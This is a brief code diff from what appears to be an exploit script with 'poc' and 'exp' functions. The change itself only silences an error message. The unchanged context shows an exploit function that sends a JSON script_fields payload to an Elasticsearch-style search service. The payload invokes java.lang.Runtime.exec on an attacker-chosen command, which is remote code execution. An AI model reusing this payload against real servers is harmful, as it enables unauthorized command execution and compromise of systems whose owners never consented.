@@ -45,7 +45,7 @@ def poc(url):
                 return True
         return False
     except Exception:
-        print "error"
+        pass
 
 def exp(url, command):
     data = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" % command
